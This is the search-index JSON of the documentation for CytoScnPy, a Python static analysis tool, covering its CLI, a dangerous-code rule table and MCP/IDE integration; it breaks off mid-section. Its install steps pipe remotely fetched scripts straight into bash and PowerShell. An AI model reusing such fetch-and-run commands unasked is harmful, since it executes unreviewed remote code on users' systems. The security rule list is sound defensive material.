{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"CytoScnPy","text":"<p>High-Performance Python Static Analysis Tool Powered by Rust</p> <p> </p> <p>CytoScnPy is a blazing fast static analysis tool for Python codebases. It uses a hybrid Rust/Python architecture to detect dead code, security vulnerabilities, and code quality issues with extreme speed and minimal memory footprint.</p>"},{"location":"#key-features","title":"Key Features","text":"<ul> <li>\ud83d\ude80 Blazing Fast: Written in Rust for maximum performance.</li> <li>\ud83d\udc80 Dead Code Detection: Finds unused functions, classes, methods, imports, and variables.</li> <li>\ud83d\udd12 Security Scanning: Detects secrets (API keys), dangerous patterns (eval/exec), and taint analysis.</li> <li>\ud83d\udcca Code Quality: Calculates Cyclomatic Complexity, Halstead metrics, and Maintainability Index.</li> <li>\ud83e\udde9 Deep Integration: VS Code extension and MCP server for AI assistants.</li> <li>\ud83d\udee0\ufe0f Framework Aware: Native support for Flask, Django, FastAPI, and Pydantic.</li> </ul>"},{"location":"#deep-integration","title":"Deep Integration","text":"<ul> <li>Hybrid Architecture: High-performance Rust core (<code>cytoscnpy</code>) with Python bindings (<code>PyO3</code>).</li> <li>Taint Analysis: Tracks data flow from untrusted sources to dangerous sinks (SQL, Shell, Code Execution).</li> <li>Clone Detection: Uses Weisfeiler-Lehman graph hashing for semantic similarity.</li> </ul>"},{"location":"#installation","title":"Installation","text":"<p>Linux / macOS:</p> <pre><code># Install\ncurl -fsSL https://raw.githubusercontent.com/djinn09/CytoScnPy/main/install.sh | bash\n</code></pre> <p>Windows (PowerShell):</p> <pre><code># Install\nirm https://raw.githubusercontent.com/djinn09/CytoScnPy/main/install.ps1 | iex\n</code></pre> <p>Via Pip:</p> <pre><code>pip install cytoscnpy\n</code></pre> <p>From Source:</p> <pre><code>git clone https://github.com/djinn09/CytoScnPy.git\ncd CytoScnPy\nmaturin develop -m cytoscnpy/Cargo.toml\n</code></pre>"},{"location":"#quick-start","title":"Quick Start","text":"<p>Analyze your current directory for everything (dead code, security, quality):</p> <pre><code>cytoscnpy . --secrets --danger --quality\n</code></pre> <p>Generate a JSON report for CI/CD:</p> <pre><code>cytoscnpy . --json &gt; report.json\n</code></pre> <p>Preview and fix dead code automatically:</p> <pre><code>cytoscnpy . --fix        # Preview changes (dry run)\ncytoscnpy . --fix --apply # Apply changes\n</code></pre>"},{"location":"#links","title":"Links","text":"<ul> <li>Documentation: djinn09.github.io/CytoScnPy</li> <li>PyPI: pypi.org/project/cytoscnpy</li> <li>VS Code Extension: Visual Studio Marketplace</li> <li>GitHub Repository: github.com/djinn09/CytoScnPy</li> </ul>"},{"location":"CLI/","title":"CLI Reference","text":"<p>This document provides a comprehensive reference for the <code>cytoscnpy</code> command-line interface.</p>"},{"location":"CLI/#command-syntax","title":"Command Syntax","text":"<pre><code>cytoscnpy [OPTIONS] [COMMAND]\n</code></pre>"},{"location":"CLI/#main-options","title":"Main Options","text":""},{"location":"CLI/#input-output","title":"Input &amp; Output","text":"<ul> <li><code>[paths]</code>: One or more paths to analyze (files or directories). If omitted, CytoScnPy defaults to the current working directory.</li> <li><code>--root &lt;PATH&gt;</code>: Explicitly sets the project root. This is highly recommended for CI/CD environments to ensure that path-based security containment is correctly applied and that relative imports are resolved consistently. When <code>--root</code> is used, positional <code>[paths]</code> are not allowed. It also ensures that reports (SARIF, GitLab, etc.) use paths relative to this root.</li> <li><code>--format &lt;FORMAT&gt;</code>: Specifies the output format. Supported values: <code>text</code> (default), <code>json</code>, <code>junit</code>, <code>github</code>, <code>gitlab</code>, <code>markdown</code>, <code>sarif</code>.</li> <li><code>--json</code>: Format the result as a raw JSON object. Shorthand for <code>--format json</code>. This is ideal for piping into tools like <code>jq</code> or for consumption by CI/CD scripts.</li> <li><code>--verbose</code>, <code>-v</code>: Prints detailed logs during the analysis process, including which files are being scanned and any non-fatal issues encountered.</li> <li><code>--quiet</code>: Minimalist output. Only the final summary table (or JSON) is displayed, suppressing the per-file findings table.</li> <li><code>--fail-on-quality</code>: Causes the process to exit with code <code>1</code> if any code quality issues (like high complexity or deep nesting) are detected.</li> <li><code>--html</code>: Generates a self-contained, interactive HTML report. Note that this feature may require additional dependencies and automatically enables quality scanning.</li> </ul>"},{"location":"CLI/#scan-types","title":"Scan Types","text":"<ul> <li><code>--secrets</code>, <code>-s</code>: Actively scans for high-entropy strings, API keys, and hardcoded credentials. It checks variables, strings, and even comments (depending on configuration).</li> <li><code>--danger</code>, <code>-d</code>: Enables security scanning for dangerous patterns like <code>eval()</code>, <code>exec()</code>, and insecure temporary file creation. It also activates taint analysis to track user-controlled data flowing into dangerous sinks (e.g., SQL injection or command injection points). See Dangerous Code for a full rule list.</li> <li><code>--quality</code>, <code>-q</code>: Runs code quality checks including Cyclomatic Complexity, Maintainability Index, block nesting depth, and function length/argument counts.</li> <li><code>--no-dead</code>, <code>-n</code>: Skips the default dead code detection. Use this if you only care about security vulnerabilities or quality metrics and want to speed up the analysis.</li> </ul>"},{"location":"CLI/#analysis-configuration","title":"Analysis Configuration","text":"<ul> <li><code>--confidence &lt;N&gt;</code>: Sets a minimum confidence threshold (0-100). CytoScnPy uses a scoring system for dead code; setting this to <code>80</code>, for example, will suppress \"noisy\" findings where the tool isn't certain the code is unused.</li> <li><code>--include-tests</code>: By default, CytoScnPy ignores files in folders like <code>tests/</code> or <code>test/</code> starting from version 1.2.2. Use this flag to include them in the analysis.</li> <li><code>--include-ipynb</code>: Enables scanning of Jupyter Notebook files. CytoScnPy extracts the Python code from cells and analyzes it as a virtual module.</li> <li><code>--ipynb-cells</code>: When combined with <code>--include-ipynb</code>, this reports findings with cell numbers instead of just line numbers, making it easier to locate issues in the Notebook UI.</li> <li><code>--clones</code>: Activates duplicate code detection. It uses AST-based hashing to find code blocks that are identical or nearly identical across your codebase.</li> <li><code>--clone-similarity &lt;N&gt;</code>: Sets the similarity threshold for clone detection (0.0 to 1.0). A value of <code>1.0</code> finds only exact duplicates; a lower value like <code>0.8</code> (default) finds similar logic that might be refactored.</li> <li><code>--fix</code>: Enables \"Dead Code Auto-Fix\" mode. By default, this is a dry-run\u2014it will show you exactly what code would be removed without touching your files.</li> <li><code>--apply</code>, <code>-a</code>: Executes the changes suggested by <code>--fix</code>. Warning: This modifies your source code. It is highly recommended to run with <code>--fix</code> first to review changes, and to have a clean Git state before applying.</li> </ul>"},{"location":"CLI/#quality-thresholds-gate-overrides","title":"Quality Thresholds (Gate Overrides)","text":"<p>These flags allow you to set strict \"gates\" for your code. If any part of the codebase exceeds these numbers, CytoScnPy will exit with code <code>1</code>.</p> <ul> <li><code>--fail-threshold &lt;N&gt;</code>: Exit with 1 if the total percentage of unused code exceeds <code>N</code>.</li> <li><code>--max-complexity &lt;N&gt;</code>: Sets the maximum allowed Cyclomatic Complexity (standard is often <code>10</code>).</li> <li><code>--min-mi &lt;N&gt;</code>: Sets the minimum allowed Maintainability Index (usually <code>40-65</code>).</li> <li><code>--max-nesting &lt;N&gt;</code>: Sets the maximum allowed indentation/nesting level (e.g., <code>3</code> or <code>4</code>).</li> <li><code>--max-args &lt;N&gt;</code>: Sets the maximum number of arguments a function can have.</li> <li><code>--max-lines &lt;N&gt;</code>: Sets the maximum number of lines a function can have.</li> </ul>"},{"location":"CLI/#subcommands","title":"Subcommands","text":""},{"location":"CLI/#raw","title":"<code>raw</code>","text":"<p>Calculate raw metrics (LOC, LLOC, SLOC, Comments, Multi, Blank).</p> <pre><code>cytoscnpy raw [OPTIONS] &lt;PATH&gt;\n</code></pre> <ul> <li><code>-j</code>, <code>--json</code>: Output JSON.</li> <li><code>-s</code>, <code>--summary</code>: Show summary metrics.</li> <li><code>-O</code>, <code>--output-file &lt;FILE&gt;</code>: Save output to file.</li> <li><code>-e</code>, <code>--exclude &lt;DIR&gt;</code>: Folders to exclude.</li> <li><code>-i</code>, <code>--ignore &lt;PATTERN&gt;</code>: Glob patterns to ignore.</li> </ul>"},{"location":"CLI/#cc","title":"<code>cc</code>","text":"<p>Calculate Cyclomatic Complexity.</p> <pre><code>cytoscnpy cc [OPTIONS] &lt;PATH&gt;\n</code></pre> <ul> <li><code>-a</code>, <code>--average</code>: Show average complexity.</li> <li><code>--total-average</code>: Show total average complexity.</li> <li><code>-s</code>, <code>--show-complexity</code>: Show complexity score with rank.</li> <li><code>-n</code>, <code>--min &lt;RANK&gt;</code>: Set minimum complexity rank (A-F).</li> <li><code>-x</code>, <code>--max &lt;RANK&gt;</code>: Set maximum complexity rank (A-F).</li> <li><code>-o</code>, <code>--order &lt;ORDER&gt;</code>: Ordering function (score, lines, alpha).</li> <li><code>--no-assert</code>: Do not count assert statements.</li> <li><code>--xml</code>: Output XML.</li> <li><code>--fail-threshold &lt;N&gt;</code>: Exit 1 if any block has complexity &gt; N.</li> <li><code>-j</code>, <code>--json</code>: Output JSON.</li> <li><code>-e</code>, <code>--exclude &lt;DIR&gt;</code>: Folders to exclude.</li> <li><code>-i</code>, <code>--ignore &lt;PATTERN&gt;</code>: Glob patterns to ignore.</li> <li><code>-O</code>, <code>--output-file &lt;FILE&gt;</code>: Save output to file.</li> </ul>"},{"location":"CLI/#hal","title":"<code>hal</code>","text":"<p>Calculate Halstead Metrics.</p> <pre><code>cytoscnpy hal [OPTIONS] &lt;PATH&gt;\n</code></pre> <ul> <li><code>-f</code>, <code>--functions</code>: Compute metrics on function level.</li> <li><code>-j</code>, <code>--json</code>: Output JSON.</li> <li><code>-e</code>, <code>--exclude &lt;DIR&gt;</code>: Folders to exclude.</li> <li><code>-i</code>, <code>--ignore &lt;PATTERN&gt;</code>: Glob patterns to ignore.</li> <li><code>-O</code>, <code>--output-file &lt;FILE&gt;</code>: Save output to file.</li> </ul>"},{"location":"CLI/#mi","title":"<code>mi</code>","text":"<p>Calculate Maintainability Index.</p> <pre><code>cytoscnpy mi [OPTIONS] &lt;PATH&gt;\n</code></pre> <ul> <li><code>-s</code>, <code>--show</code>: Show actual MI value.</li> <li><code>-a</code>, <code>--average</code>: Show average MI.</li> <li><code>-n</code>, <code>--min &lt;RANK&gt;</code>: Set minimum MI rank (A-C).</li> <li><code>-x</code>, <code>--max &lt;RANK&gt;</code>: Set maximum MI rank (A-C).</li> <li><code>--multi</code>: Count multiline strings as comments (default: true).</li> <li><code>--fail-threshold &lt;N&gt;</code>: Exit 1 if any file has MI &lt; N.</li> <li><code>-j</code>, <code>--json</code>: Output JSON.</li> <li><code>-e</code>, <code>--exclude &lt;DIR&gt;</code>: Folders to exclude.</li> <li><code>-i</code>, <code>--ignore &lt;PATTERN&gt;</code>: Glob patterns to ignore.</li> <li><code>-O</code>, <code>--output-file &lt;FILE&gt;</code>: Save output to file.</li> </ul>"},{"location":"CLI/#stats","title":"<code>stats</code>","text":"<p>Generate comprehensive project statistics report.</p> <pre><code>cytoscnpy stats [OPTIONS] &lt;PATH&gt;\n</code></pre> <ul> <li><code>-a</code>, <code>--all</code>: Enable all analysis: secrets, danger, quality, files.</li> <li><code>--root &lt;PATH&gt;</code>: Project root for analysis (use instead of positional path).</li> <li><code>-s</code>, <code>--secrets</code>: Scan for secrets.</li> <li><code>-d</code>, <code>--danger</code>: Scan for dangerous code.</li> <li><code>-q</code>, <code>--quality</code>: Scan for quality issues.</li> <li><code>-j</code>, <code>--json</code>: Output JSON.</li> <li><code>-o</code>, <code>--output &lt;FILE&gt;</code>: Output file path.</li> <li><code>--exclude-folder &lt;DIR&gt;</code>: Exclude specific folders from analysis.</li> </ul>"},{"location":"CLI/#files","title":"<code>files</code>","text":"<p>Show per-file metrics table.</p> <pre><code>cytoscnpy files [OPTIONS] &lt;PATH&gt;\n</code></pre> <ul> <li><code>-j</code>, <code>--json</code>: Output only JSON.</li> <li><code>--exclude-folder &lt;DIR&gt;</code>: Exclude specific folders from analysis.</li> </ul>"},{"location":"CLI/#mcp-server","title":"<code>mcp-server</code>","text":"<p>Start MCP server for LLM integration.</p> <pre><code>cytoscnpy mcp-server\n</code></pre>"},{"location":"CLI/#configuration-file","title":"Configuration File","text":"<p>Create <code>.cytoscnpy.toml</code> in your project root to set defaults.</p> <pre><code>[cytoscnpy]\n# Core settings\nconfidence = 60\nsecrets = true\ndanger = true\nquality = true\ninclude_tests = false\ninclude_ipynb = false\n# Note: ipynb_cells is currently a CLI-only option\n\n# Quality thresholds\nmax_complexity = 10        # Max cyclomatic complexity\nmax_nesting = 3            # Max nesting depth\nmax_args = 5               # Max function arguments\nmax_lines = 50             # Max function lines\nmin_mi = 40.0              # Min Maintainability Index\n\n# Path filters\nexclude_folders = [\"build\", \"dist\", \".venv\"]\ninclude_folders = [\"src\"]\n\n# CI/CD\nfail_threshold = 5.0\n</code></pre>"},{"location":"CLI/#exit-codes","title":"Exit Codes","text":"<ul> <li><code>0</code>: Success, no issues found (or issues below threshold).</li> <li><code>1</code>: Issues found exceeding thresholds (quality, security, or fail_threshold).</li> <li><code>2</code>: Runtime error or invalid arguments.</li> </ul>"},{"location":"CLI/#see-also","title":"See Also","text":"<ul> <li>Usage Guide</li> </ul>"},{"location":"contributing/","title":"Contributing to CytoScnPy","text":"<p>Thank you for your interest in contributing to CytoScnPy!</p>"},{"location":"contributing/#prerequisites","title":"\ud83d\udee0\ufe0f Prerequisites","text":"<ul> <li>Rust: Version 1.70 or higher.</li> <li>Cargo: Comes with Rust.</li> <li>Python: Version 3.8 or higher.</li> <li>Maturin: <code>pip install maturin</code></li> </ul>"},{"location":"contributing/#setup-development-environment","title":"\ud83d\ude80 Setup Development Environment","text":"<ol> <li>Fork and Clone:</li> </ol> <pre><code>git clone https://github.com/YOUR_USERNAME/cytoscnpy.git\ncd cytoscnpy\n</code></pre> <ol> <li>Create Virtual Environment:</li> </ol> <pre><code>python -m venv .venv\nsource .venv/bin/activate  # Linux/macOS\n.venv\\Scripts\\activate     # Windows\n</code></pre> <ol> <li>Install Dependencies &amp; Build:</li> </ol> <pre><code>pip install maturin\nmaturin develop -m cytoscnpy/Cargo.toml\n</code></pre> <ol> <li>Run Tests:</li> </ol> <pre><code>cargo test\npytest python/tests\n</code></pre>"},{"location":"contributing/#development-workflow","title":"\ud83d\udd04 Development Workflow","text":"<ol> <li> <p>Create a Branch: <code>git checkout -b feature/your-feature</code></p> </li> <li> <p>Make Changes:</p> </li> <li> <p>Run <code>cargo fmt</code> to format.</p> </li> <li> <p>Run <code>cargo clippy</code> to lint.</p> </li> <li> <p>Test:</p> </li> <li> <p><code>cargo test</code> (Rust unit tests)</p> </li> <li> <p><code>pytest</code> (Python integration tests)</p> </li> <li> <p>Submit PR:</p> </li> <li>Push to your fork.</li> <li>Open a Pull Request on GitHub.</li> </ol>"},{"location":"contributing/#project-structure","title":"\ud83d\udcc2 Project Structure","text":"<ul> <li><code>cytoscnpy/</code> - Rust core library &amp; analysis engine.</li> <li><code>python/</code> - Python wrapper &amp; CLI entry point.</li> <li><code>editors/vscode/</code> - VS Code extension.</li> <li><code>cytoscnpy-mcp/</code> - MCP server documentation.</li> </ul>"},{"location":"contributing/#testing","title":"\ud83e\uddea Testing","text":"<p>We have a comprehensive test suite.</p> <pre><code># Run all Rust tests\ncargo test\n\n# Run specific test\ncargo test test_name\n</code></pre> <p>See tests/README.md for detailed testing guide.</p>"},{"location":"dangerous-code/","title":"Dangerous Code","text":"<p>This document outlines potential security vulnerabilities and dangerous coding practices that CytoScnPy can detect. Each rule is categorized and includes a description, severity, and recommendations for remediation.</p>"},{"location":"dangerous-code/#code-execution","title":"Code Execution","text":"<p>These rules identify code that can lead to arbitrary code execution.</p> Rule ID Description Severity Impact Recommendation CSP-D001 <code>eval(...)</code> HIGH Arbitrary code execution Use <code>ast.literal_eval</code> or a dedicated parser CSP-D002 <code>exec(...)</code> HIGH Arbitrary code execution Remove or use explicit dispatch CSP-D003 <code>os.system(...)</code>, <code>subprocess.*(shell=True)</code> CRITICAL Command injection <code>subprocess.run([cmd, ...])</code>; strict allowlist CSP-D004 <code>asyncio.create_subprocess_shell(...)</code> CRITICAL Async command injection Use <code>create_subprocess_exec</code> with list args CSP-D005 <code>input(...)</code> HIGH ACE in legacy Python contexts Validate input; safe in Python 3"},{"location":"dangerous-code/#injection","title":"Injection","text":"<p>These rules detect various forms of injection vulnerabilities.</p> Rule ID Description Severity Impact Recommendation CSP-D101 <code>cursor.execute</code> (f-string/concat) CRITICAL SQL injection (cursor) Use parameterized queries (<code>?</code>, <code>%s</code>) CSP-D102 <code>sqlalchemy.text</code>, <code>read_sql</code> (dynamic) CRITICAL SQL injection (raw) Use bound parameters / ORM builders CSP-D103 Flask/Jinja dynamic templates CRITICAL XSS (Cross-site scripting) Use static templates; escape content CSP-D104 <code>xml.etree</code>, <code>minidom</code>, <code>sax</code>, <code>lxml</code> HIGH / MED XXE / DoS Use <code>defusedxml</code> CSP-D105 <code>django.utils.safestring.mark_safe</code> MEDIUM XSS bypass Avoid unless content is strictly trusted"},{"location":"dangerous-code/#deserialization","title":"Deserialization","text":"<p>These rules identify insecure deserialization practices.</p> Rule ID Description Severity Impact Recommendation CSP-D201 <code>pickle</code>, <code>dill</code>, <code>shelve</code>, <code>jsonpickle</code>, <code>pandas.read_pickle</code> CRITICAL Arbitrary code execution Use JSON, msgpack, or signed data CSP-D202 <code>yaml.load</code> (no SafeLoader) HIGH Arbitrary code execution <code>yaml.safe_load(...)</code> CSP-D203 <code>marshal.load</code>/<code>loads</code> MEDIUM Arbitrary code execution Use JSON or signed data CSP-D204 <code>torch.load</code>, <code>keras.load_model</code>, <code>joblib.load</code> CRITICAL ACE via embedded pickle Use <code>weights_only=True</code> (torch)"},{"location":"dangerous-code/#cryptography","title":"Cryptography","text":"<p>These rules highlight the misuse of cryptographic primitives.</p> Rule ID Description Severity Impact Recommendation CSP-D301 Weak hashing (MD5, etc.) MEDIUM Collision-prone weak hash Use SHA-256 or SHA-3 CSP-D302 Weak hashing (SHA-1) MEDIUM Collision-prone weak hash Use SHA-256 or SHA-3 CSP-D304 Insecure ciphers (DES, ARC4, etc.) HIGH Process/Data compromise Use AES CSP-D305 Insecure cipher modes (ECB) MEDIUM Pattern leakage in cipher Use CBC or GCM CSP-D311 <code>random.*</code> (Standard PRNG) LOW Predictable for crypto use Use <code>secrets</code> or <code>os.urandom</code>"},{"location":"dangerous-code/#network","title":"Network","text":"<p>These rules relate to insecure network communication practices.</p> Rule ID Description Severity Impact Recommendation CSP-D401 <code>requests.*(verify=False)</code> HIGH MITM attacks Keep <code>verify=True</code> CSP-D402 Unvalidated URLs in network calls CRITICAL SSRF (Request forgery) Allowlist domains; validate host/port CSP-D403 <code>app.run(debug=True)</code> HIGH Possible RCE in production Set <code>debug=False</code> CSP-D404 Hardcoded bind to <code>0.0.0.0</code> or <code>::</code> MEDIUM Exposes service to external Bind to <code>127.0.0.1</code> locally CSP-D405 Request without timeout MEDIUM Thread/Process exhaustion Set <code>timeout=5.0</code> (or similar) CSP-D406 <code>ftplib.*</code> MEDIUM Cleartext FTP traffic Use SFTP or FTPS CSP-D407 <code>HTTPSConnection</code> without context MEDIUM MITM on legacy Python Provide a secure SSL context CSP-D408 <code>ssl._create_unverified_context</code> MEDIUM Bypasses SSL verification Use default secure context CSP-D409 <code>telnetlib.*</code> MEDIUM Cleartext Telnet traffic Use SSH (<code>paramiko</code>) CSP-D410 <code>urllib.urlopen</code> (audit schemes) MEDIUM <code>file://</code> scheme exploits Validate/restrict schemes CSP-D411 <code>ssl.wrap_socket</code> (deprecated) MEDIUM Often insecure/deprecated Use <code>SSLContext.wrap_socket</code>"},{"location":"dangerous-code/#filesystem","title":"Filesystem","text":"<p>These rules relate to insecure file system operations.</p> Rule ID Description Severity Impact Recommendation CSP-D501 Dynamic path in <code>open</code>/<code>os.path</code> HIGH Path traversal Use <code>Path.resolve</code>, check base dir CSP-D502 <code>tarfile.extractall</code> without filter HIGH Path traversal / Zip Slip Use <code>filter='data'</code> (Py 3.12+) CSP-D503 <code>zipfile.ZipFile.extractall</code> HIGH Path traversal / Zip Slip Validate member filenames CSP-D504 <code>tempfile.mktemp</code> HIGH Race condition (TOCTOU) Use <code>tempfile.mkstemp</code> CSP-D505 <code>os.chmod</code> with <code>stat.S_IWOTH</code> HIGH World-writable file Use stricter permissions (0o600) CSP-D506 <code>os.tempnam</code>/<code>tmpnam</code> MEDIUM Symlink attacks Use <code>tempfile</code> module"},{"location":"dangerous-code/#type-safety","title":"Type Safety","text":"<p>These rules address potential issues related to type handling.</p> Rule ID Description Severity Impact Recommendation CSP-D601 Type-based method misuse HIGH Logic errors / Type confusion Use static typing and validation"},{"location":"dangerous-code/#best-practices","title":"Best Practices","text":"<p>These rules highlight deviations from recommended secure coding practices.</p> Rule ID Description Severity Impact Recommendation CSP-D701 <code>assert</code> used in production code LOW Asserts are removed in optimized mode (<code>-O</code>) Use explicit <code>if ...: raise</code> CSP-D702 Insecure Imports (<code>telnetlib</code>, <code>ftplib</code>, etc) HIGH / LOW Use of deprecated/insecure libraries Use modern replacements (<code>requests</code>, <code>ssh</code>) CSP-D703 <code>Jinja2 Environment(autoescape=False)</code> HIGH Risk of XSS if content is not escaped Set <code>autoescape=True</code> CSP-D704 Blacklisted function calls (e.g., <code>pdb.set_trace</code>) LOW / MED Debugging leftovers in production Remove debug code"},{"location":"dangerous-code/#open-redirect","title":"Open Redirect","text":"<p>This category covers vulnerabilities related to insecure redirection.</p> Rule ID Description Severity Impact Recommendation CSP-D801 Open Redirect HIGH User redirection to malicious sites Validate redirect URLs/domains"},{"location":"dangerous-code/#privacy","title":"Privacy","text":"<p>These rules address potential privacy violations.</p> Rule ID Description Severity Impact Recommendation CSP-D901 Logging sensitive variables MEDIUM Data leakage in logs Redact passwords, tokens, API keys CSP-D902 Hardcoded <code>SECRET_KEY</code> CRITICAL Key exposure in Django Store in environment variables"},{"location":"dangerous-code/#generic","title":"Generic","text":"<p>This is a catch-all category for general vulnerabilities.</p> Rule ID Description Severity Impact Recommendation CSP-X001 Generic XSS (detected via taint) CRITICAL Potential for script injection Sanitize/encode output, use templating engines"},{"location":"integrations/","title":"Integrations","text":"<p>CytoScnPy integrates with your development workflow via IDE extensions and the Model Context Protocol (MCP).</p>"},{"location":"integrations/#vs-code-extension","title":"VS Code Extension","text":"<p>Get real-time feedback while you code.</p>"},{"location":"integrations/#installation","title":"Installation","text":"<ol> <li>Search for \"CytoScnPy\" in the VS Code Marketplace.</li> <li>Install the extension.</li> </ol>"},{"location":"integrations/#commands","title":"Commands","text":"<p>Access via Command Palette (<code>Ctrl+Shift+P</code> / <code>Cmd+Shift+P</code>):</p> Command Description <code>CytoScnPy: Analyze Current File</code> Trigger analysis for the active file. <code>CytoScnPy: Analyze Workspace</code> Analyze all Python files in the workspace. <code>CytoScnPy: Calculate Cyclomatic Complexity (cc)</code> Show complexity metrics for current file. <code>CytoScnPy: Calculate Halstead Metrics (hal)</code> Show Halstead metrics for current file. <code>CytoScnPy: Calculate Maintainability Index (mi)</code> Show MI scores for current file. <code>CytoScnPy: Calculate Raw Metrics (raw)</code> Show LOC, SLOC, and other raw metrics."},{"location":"integrations/#configuration","title":"Configuration","text":"<p>Customize behavior in VS Code Settings (<code>Ctrl+,</code>):</p> <p>| <code>cytoscnpy.analysisMode</code> | <code>workspace</code> | Analysis mode: <code>workspace</code> (accurate) or <code>file</code> (fast). | | <code>cytoscnpy.enableSecretsScan</code> | <code>false</code> | Enable scanning for keys/tokens. | | <code>cytoscnpy.enableDangerScan</code> | <code>false</code> | Enable dangerous code patterns scanning. | | <code>cytoscnpy.enableQualityScan</code> | <code>false</code> | Enable code quality metrics scanning. | | <code>cytoscnpy.enableCloneScan</code> | <code>false</code> | Enable clone detection scanning. | | <code>cytoscnpy.confidenceThreshold</code> | <code>0</code> | Min confidence (0-100). 0 shows all findings. | | <code>cytoscnpy.excludeFolders</code> | <code>[]</code> | Folders to exclude from analysis. | | <code>cytoscnpy.includeFolders</code> | <code>[]</code> | Folders to force-include in analysis. | | <code>cytoscnpy.includeTests</code> | <code>false</code> | Include test files in analysis. | | <code>cytoscnpy.includeIpynb</code> | <code>false</code> | Include Jupyter Notebooks (.ipynb files). | | <code>cytoscnpy.maxComplexity</code> | <code>10</code> | Maximum allowed Cyclomatic Complexity. | | <code>cytoscnpy.minMaintainabilityIndex</code> | <code>40</code> | Minimum Maintainability Index. | | <code>cytoscnpy.maxNesting</code> | <code>3</code> | Maximum allowed nesting depth. | | <code>cytoscnpy.maxArguments</code> | <code>5</code> | Maximum allowed function arguments. | | <code>cytoscnpy.maxLines</code> | <code>50</code> | Maximum allowed function lines. | | <code>cytoscnpy.path</code> | <code>\"\"</code> | Custom path to CLI executable. |</p>"},{"location":"integrations/#mcp-server-ai-assistants","title":"MCP Server (AI Assistants)","text":"<p>Enable AI assistants (Claude, Cursor, Copilot) to use CytoScnPy tools.</p> <p>Note: HTTP/SSE transport is planned for future releases to enable remote analysis. See Roadmap for details.</p>"},{"location":"integrations/#github-copilot","title":"GitHub Copilot","text":"<p>The VS Code extension automatically registers the MCP server. Just ask Copilot:</p> <p>\"Run a security scan on this file\"</p>"},{"location":"integrations/#manual-setup-claudecursor","title":"Manual Setup (Claude/Cursor)","text":"<p>If not using VS Code, run the server manually:</p> <pre><code>cytoscnpy mcp-server\n</code></pre> <p>Claude Desktop Config:</p> <pre><code>{\n  \"mcpServers\": {\n    \"cytoscnpy\": {\n      \"command\": \"cytoscnpy\",\n      \"args\": [\"mcp-server\"]\n    }\n  }\n}\n</code></pre>"},{"location":"integrations/#available-tools","title":"Available Tools","text":"<p>When connected, CytoScnPy exposes the following tools to Claude/Copilot:</p> Tool Description <code>analyze_path</code> Full analysis on files/directories. (Secrets, Danger, Quality, Taint) <code>analyze_code</code> Analyze a code snippet directly. <code>quick_scan</code> Fast security scan (Secrets &amp; Dangerous patterns). <code>cyclomatic_complexity</code> Calculate complexity metrics for a path. <code>maintainability_index</code> Calculate MI scores (0-100) for a path."},{"location":"integrations/#configuration_1","title":"Configuration","text":""},{"location":"integrations/#claude-desktop","title":"Claude Desktop","text":"<p>Add to <code>claude_desktop_config.json</code>:</p> <pre><code>{\n  \"mcpServers\": {\n    \"cytoscnpy\": {\n      \"command\": \"cytoscnpy\",\n      \"args\": [\"mcp-server\"]\n    }\n  }\n}\n</code></pre>"},{"location":"integrations/#github-copilot-vs-code","title":"GitHub Copilot (VS Code)","text":"<p>Automatically enabled when the VS Code Extension is installed. No extra config needed.</p>"},{"location":"integrations/#cicd-integrations","title":"CI/CD Integrations","text":"<p>CytoScnPy supports a wide variety of CI/CD environments through structured output formats (JSON, GitLab, SARIF, GitHub Annotations).</p> <p>For detailed setup guides and examples for:</p> <ul> <li>GitLab Code Quality</li> <li>GitHub Actions Annotations</li> <li>SARIF Security Dashboards</li> <li>JUnit Test Reports</li> </ul> <p>See the CI/CD Integration Guide in our User Guide.</p>"},{"location":"migration/","title":"Migration Guide","text":""},{"location":"migration/#upgrading-to-v125","title":"Upgrading to v1.2.5","text":""},{"location":"migration/#ci-workflow-improvements","title":"CI Workflow Improvements","text":"<ul> <li>Python 3.13 Support: If you are using <code>pip install</code> on Linux with Python 3.13, you no longer need the standalone installer as a workaround. Wheels are now explicitly built for Python 3.9 through 3.13 for all supported platforms.</li> </ul>"},{"location":"migration/#upgrading-to-v122","title":"Upgrading to v1.2.2","text":""},{"location":"migration/#behavioral-changes","title":"Behavioral Changes","text":"<ul> <li>Test Exclusion: Starting from v1.2.2, tests are excluded by default in both the CLI and library API to reduce noise. Use the <code>--include-tests</code> flag if you want to scan your test files.</li> </ul>"},{"location":"migration/#upgrading-to-v120","title":"Upgrading to v1.2.0","text":""},{"location":"migration/#breaking-changes","title":"Breaking Changes","text":"<ul> <li>Pre-commit Hooks: The hook <code>rev</code> should be updated to <code>v1.2.1</code> in your <code>.pre-commit-config.yaml</code>.</li> <li>Parser Engine: Switched from <code>rustpython-parser</code> to <code>ruff_python_parser</code>. This improves performance and Python 3.12+ compatibility but may handle syntax errors more strictly.</li> </ul>"},{"location":"migration/#command-line-interface","title":"Command Line Interface","text":"<ul> <li>Subcommands: Metric calculations are now grouped under subcommands (<code>raw</code>, <code>cc</code>, <code>hal</code>, <code>mi</code>, <code>stats</code>, <code>files</code>).</li> <li>Old: <code>cytoscnpy --raw</code> (hypothetical legacy)</li> <li>New: <code>cytoscnpy raw .</code></li> <li>Output: The <code>stats</code> subcommand with <code>--all</code> is the recommended default for CI pipelines requiring full analysis.</li> </ul>"},{"location":"migration/#configuration","title":"Configuration","text":"<ul> <li>Notebooks: <code>include_ipynb</code> and <code>ipynb_cells</code> are currently CLI-only flags. Verify they are passed in your command line arguments, as they are not yet supported in <code>.cytoscnpy.toml</code>.</li> </ul>"},{"location":"migration/#upgrading-from-v10x","title":"Upgrading from v1.0.x","text":""},{"location":"migration/#feature-flags","title":"Feature Flags","text":"<ul> <li>CFG Support: Control Flow Graph analysis is now an opt-in feature. Build with <code>--features cfg</code> if you rely on deep behavioral analysis for clone detection.</li> </ul>"},{"location":"migration/#python-api","title":"Python API","text":"<ul> <li>Entry Point: The <code>cytoscnpy.run()</code> function is the stable entry point. Direct access to internal modules is not guaranteed.</li> </ul>"},{"location":"pre-commit/","title":"Pre-commit Hooks","text":"<p>CytoScnPy provides several pre-commit hooks to automate code analysis in your local development workflow. This ensures that unused code, security vulnerabilities, and quality issues are caught before they reach your repository.</p>"},{"location":"pre-commit/#installation","title":"Installation","text":"<ol> <li> <p>Install pre-commit:</p> <pre><code>pip install pre-commit\n</code></pre> </li> <li> <p>Add Configuration: Create or update <code>.pre-commit-config.yaml</code> in your project root:</p> <pre><code>repos:\n  - repo: 